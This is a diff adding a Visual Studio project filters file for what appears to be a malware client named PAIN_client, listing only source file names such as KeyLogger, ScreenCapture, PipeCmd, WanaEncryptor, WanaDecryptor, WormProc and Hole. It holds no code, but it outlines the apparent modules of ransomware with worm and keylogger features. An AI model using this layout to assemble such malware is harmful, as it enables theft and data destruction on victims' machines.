@@ -1,0 +1,170 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="來源檔案">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="標頭檔">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="資源檔">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="來源檔案\SixPathOfPain">
+      <UniqueIdentifier>{32af6103-517e-4452-aada-64f8e29235c6}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="EnumProcess.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="tstring.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="SearchFile.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="ScreenCapture.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="BmpCImage.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="KeyLogger.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="VirtualKeyToAscii.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="resource.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="PipeCmd.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="config.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="WanaFile.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="ezfile.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="hexdump.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="WanaProc.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="socktool.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="WanaEncryptor.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="EZRSA.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="keys.h">
+      <Filter>來源檔案</Filter>
+    </ClInclude>
+    <ClInclude Include="FileList.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="common.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="WanaZip.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="EZAES.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="WormProc.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="Hole.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+    <ClInclude Include="WanaDecryptor.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="EnumProcess.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="SearchFile.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="ScreenCapture.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="BmpCImage.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="KeyLogger.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="PipeCmd.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="HumanPathTest.cpp">
+      <Filter>來源檔案\SixPathOfPain</Filter>
+    </ClCompile>
+    <ClCompile Include="WanaFile.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="ezfile.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="hexdump.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="WanaProc.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="socktool.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="WanaEncryptor.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="EZRSA.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="FileList.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="WanaZip.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="EZAES.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="WormProc.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="WanaDecryptor.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="DevaPathTest.cpp">
+      <Filter>來源檔案\SixPathOfPain</Filter>
+    </ClCompile>
+    <ClCompile Include="PriKey.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="PubKey.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="PAIN_client.rc">
+      <Filter>資源檔</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+</Project>
